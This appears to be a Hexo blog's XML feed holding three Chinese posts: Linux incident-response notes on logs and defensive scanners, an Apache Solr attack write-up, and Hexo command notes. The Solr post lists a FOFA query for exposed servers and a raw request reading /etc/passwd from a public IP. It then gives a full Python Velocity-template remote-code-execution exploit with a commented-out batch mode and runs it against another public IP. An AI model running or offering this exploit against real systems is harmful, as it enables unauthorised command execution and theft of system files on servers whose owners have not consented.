class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5、su切换用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by</span><br><span class="line">root(uid&#x3D;0)</span><br></pre></td></tr></table></figure><p>sudo授权执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:  good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ;</span><br><span class="line">COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h4><h5 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h5><p>chkrootkit<br>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a><br>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#编译完成没有报错的话执行检查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;chkrootkit</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rkhunter<br>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Wget https:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;rkhunter&#x2F;rkhunter&#x2F;1.4.4&#x2F;rkhunter-</span><br><span class="line">1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line">rkhunter -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h5><p>Clamav<br>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a><br>安装方式一：<br>1、安装zlib：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;libpng&#x2F;zlib&#x2F;1.2.7&#x2F;zlib-1.2.7.tar.gz</span><br><span class="line">tar -zxvf zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#安装一下gcc编译环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line">CFLAGS&#x3D;&quot;-O3 -fPIC&quot; .&#x2F;configure --prefix&#x3D; &#x2F;usr&#x2F;local&#x2F;zlib&#x2F;</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、添加用户组clamav和组成员clamav：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s &#x2F;bin&#x2F;false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、安装Clamav</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;opt&#x2F;clamav --disable-clamav -with-zlib&#x3D;&#x2F;usr&#x2F;local&#x2F;zlib</span><br><span class="line">make</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-40.png" alt="upload successful"><br>4、配置Clamav</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;updata</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;freshclam.log</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;clamd.log</span><br><span class="line">cd &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5、ClamAV 使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;clamav&#x2F;bin&#x2F;freshclam 升级病毒库</span><br><span class="line">.&#x2F;clamscan –h 查看相应的帮助信息</span><br><span class="line">.&#x2F;clamscan -r &#x2F;home 扫描所有用户的主目录就使用</span><br><span class="line">.&#x2F;clamscan -r --bell -i &#x2F;bin 扫描bin目录并且显示有问题的文件的扫描结果</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装方式二：<br>#安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y clamav</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#更新病毒库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freshclam</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#扫描方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clamscan -r &#x2F;etc --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;etcclamav.log</span><br><span class="line">clamscan -r &#x2F;bin --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;binclamav.log</span><br><span class="line">clamscan -r &#x2F;usr --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;usrclamav.log</span><br></pre></td></tr></table></figure><p>#扫描并杀毒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clamscan -r --remove &#x2F;usr&#x2F;bin&#x2F;bsd-port</span><br><span class="line">clamscan -r --remove &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">clamscan -r --remove &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#查看日志发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;usrclamav.log |grep FOUND</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h5><p>linux版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http:&#x2F;&#x2F;www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F;backdoor_detection.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h5><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rpm -Va &gt; rpm.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字<br>符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。<br>验证内容中的8个信息的具体内容如下：<br>S     文件大小是否改变<br>M     文件的类型或文件的权限（rwx）是否被改变<br>5     文件MD5校验是否改变（可以看成文件内容是否改变）<br>D     设备中，从代码是否改变<br>L     文件路径是否改变<br>U     文件的属主（所有者）是否改变<br>G     文件的属组是否改变<br>T     文件的修改时间是否改变<br>如果命令被替换了，如果还原回来：<br>文件提取还原案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpm -qf &#x2F;bin&#x2F;ls 查询ls命令属于哪个软件包</span><br><span class="line">mv &#x2F;bin&#x2F;ls &#x2F;tmp 先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Packages&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls 提取rpm包中ls</span><br><span class="line">命令到当前目录的&#x2F;bin&#x2F;ls下</span><br><span class="line">cp &#x2F;root&#x2F;bin&#x2F;ls &#x2F;bin&#x2F; 把ls命令复制到&#x2F;bin&#x2F;目录 修复文件丢失</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h5><p>Github项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;GScan</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ppabc&#x2F;security_check</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;T0xst&#x2F;linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-Sole 任意文件读取漏洞</title>
      <link href="2021/03/29/apache-sole-ren-yi-wen-jian-du-qu-lou-dong/"/>
      <url>2021/03/29/apache-sole-ren-yi-wen-jian-du-qu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h4 id="Apache-Sole-任意文件读取漏洞"><a href="#Apache-Sole-任意文件读取漏洞" class="headerlink" title="Apache-Sole 任意文件读取漏洞"></a>Apache-Sole 任意文件读取漏洞</h4><p><img src="/images/pasted-25.png" alt="upload successful"></p><h6 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h6><p>fofa搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;Apache-Solr&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-27.png" alt="upload successful"></p><p><img src="/images/pasted-28.png" alt="upload successful"></p><h6 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h6><p>判断漏洞是否存在<br>获取core的信息：主要是name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-29.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;responseHeader&quot;:&#123;</span><br><span class="line">    &quot;status&quot;:0,</span><br><span class="line">    &quot;QTime&quot;:0&#125;,</span><br><span class="line">  &quot;initFailures&quot;:&#123;&#125;,</span><br><span class="line">  &quot;status&quot;:&#123;</span><br><span class="line">    &quot;composition&quot;:&#123;</span><br><span class="line">      &quot;name&quot;:&quot;composition&quot;,</span><br><span class="line">      &quot;instanceDir&quot;:&quot;&#x2F;home&#x2F;server&#x2F;solr-7.7.3&#x2F;server&#x2F;solr&#x2F;composition&quot;,</span><br><span class="line">      &quot;dataDir&quot;:&quot;&#x2F;home&#x2F;server&#x2F;solr-7.7.3&#x2F;server&#x2F;solr&#x2F;composition&#x2F;data&#x2F;&quot;,</span><br><span class="line">      &quot;config&quot;:&quot;solrconfig.xml&quot;,</span><br><span class="line">      &quot;schema&quot;:&quot;managed-schema&quot;,</span><br><span class="line">      &quot;startTime&quot;:&quot;2021-03-29T12:09:09.454Z&quot;,</span><br><span class="line">      &quot;uptime&quot;:44928793&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>burpsuit抓包修改<br><img src="/images/pasted-30.png" alt="upload successful"></p><p>post包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;composition&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1</span><br><span class="line">Host: 39.97.235.243:8983</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.82 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;tesla&#x2F;config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-31.png" alt="upload successful"></p><h6 id="第三步-写脚本exp"><a href="#第三步-写脚本exp" class="headerlink" title="第三步 写脚本exp"></a>第三步 写脚本exp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">banner &#x3D; &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">                   Apache Solr Velocity模板远程代码执行</span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"></span><br><span class="line">                         python By www.summer13.top</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">print banner</span><br><span class="line"></span><br><span class="line">def get_code_name(url):</span><br><span class="line">    if url[-1] &#x3D;&#x3D; &#39;&#x2F;&#39;:</span><br><span class="line">        url &#x3D; url[:-1].split(&#39;\n&#39;)[0]</span><br><span class="line">    else:</span><br><span class="line">        url &#x3D; url.split(&#39;\n&#39;)[0]</span><br><span class="line">        </span><br><span class="line">    core_url &#x3D; url + &#39;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&#39;</span><br><span class="line">    print &#39;[+] Querying Core Name: &#39;+core_url,&#39;\n&#39;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        # r &#x3D; requests.get(core_url,proxies&#x3D;proxies)</span><br><span class="line">        r &#x3D; requests.get(core_url)</span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200 and &#39;responseHeader&#39; in r.content and &#39;status&#39; in r.content:</span><br><span class="line">            json_str &#x3D; json.loads(r.content)</span><br><span class="line">            for i in json_str[&#39;status&#39;]:</span><br><span class="line">                core_name_url &#x3D; url + &#39;&#x2F;solr&#x2F;&#39; + i + &#39;&#x2F;config&#39;</span><br><span class="line">                print core_name_url</span><br><span class="line">                update_queryresponsewriter(core_name_url)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;No core name exit!&quot;</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">def update_queryresponsewriter(core_name_url):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0&#39;,</span><br><span class="line">    &#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&#39;,</span><br><span class="line">    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">    &#39;Content-Length&#39;: &#39;259&#39;,</span><br><span class="line">    &#39;Connection&#39;: &#39;close&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;&#39;&#39;&#39;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    r &#x3D; requests.post(core_name_url,headers&#x3D;headers,data&#x3D;payload)</span><br><span class="line">    # r &#x3D; requests.post(core_name_url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;proxies)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 200 and &#39;responseHeader&#39; in r.content:</span><br><span class="line">        print &#39;[+] exp enable Successful!&#39;</span><br><span class="line">        exp_url &#x3D; core_name_url[:-7]</span><br><span class="line">        cmd &#x3D; &#39;whoami&#39;</span><br><span class="line">        cmd &#x3D; sys.argv[2]</span><br><span class="line"></span><br><span class="line">        send_exp(exp_url,cmd)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[+] Enable Fail!\n&quot;</span><br><span class="line">def send_exp(exp_url,cmd):</span><br><span class="line">    exp_url &#x3D; exp_url + r&quot;&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27&quot; + cmd + r&quot;%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    r &#x3D; requests.get(exp_url)</span><br><span class="line">    # r &#x3D; requests.get(exp_url,proxies&#x3D;proxies)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 400 or r.status_code &#x3D;&#x3D; 500  or r.status_code &#x3D;&#x3D;200 and len(r.content) &gt;0:</span><br><span class="line">        print &quot;&gt;&gt;&gt; [+] Exp Send Successful! &lt;&lt;&lt;&quot;</span><br><span class="line">        print &quot;____________________________________________________________&quot;</span><br><span class="line">        print &#39;\n&#39;,exp_url,&#39;\n&#39;</span><br><span class="line">        print &#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n&#39;,r.content</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[+] EXP No Send Successful!\n&quot;</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        sys.exit(&quot;\n [+] Usage:  python %s http:&#x2F;&#x2F;x.x.x.x:8983  command\n&quot; % sys.argv[0])</span><br><span class="line">    else:</span><br><span class="line">        # url &#x3D; &quot;http:&#x2F;&#x2F;192.168.5.86:8983&quot;</span><br><span class="line">        url &#x3D; sys.argv[1]</span><br><span class="line">        get_code_name(url)</span><br><span class="line">    </span><br><span class="line">        # 批量</span><br><span class="line">        # f &#x3D; open(&#39;url.txt&#39;,&#39;rb&#39;)</span><br><span class="line">        # for i in f.readlines():</span><br><span class="line">        #     url &#x3D; i.split(&#39;\r\n&#39;)[0]</span><br><span class="line">        #     get_code_name(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 solr_rce.py http:&#x2F;&#x2F;43.247.70.223:8086&#x2F; whoami</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-33.png" alt="upload successful"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello 暗影LXH十三先生</title>
      <link href="2021/03/23/hello-world/"/>
      <url>2021/03/23/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="hexo常用命令笔记"><a href="#hexo常用命令笔记" class="headerlink" title="hexo常用命令笔记"></a>hexo常用命令笔记</h3><h6 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h6><p>npm install hexo -g #安装<br>npm update hexo -g #升级<br>hexo init #初始化</p><h6 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h6><p>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo p == hexo publish<br>hexo g == hexo generate#生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy#部署</p><h6 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h6><p>hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP</p><p>hexo clean #清除缓存 网页正常情况下可以忽略此条命令<br>hexo g #生成静态网页<br>hexo d #开始部署</p><h6 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h6><p>hexo generate #使用 Hexo 生成静态文件快速而且简单<br>hexo generate –watch #监视文件变动</p><h6 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h6><p>两个命令的作用是相同的<br>hexo generate –deploy<br>hexo deploy –generate</p><p>hexo deploy -g<br>hexo server -g</p><h6 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h6 id="模版"><a href="#模版" 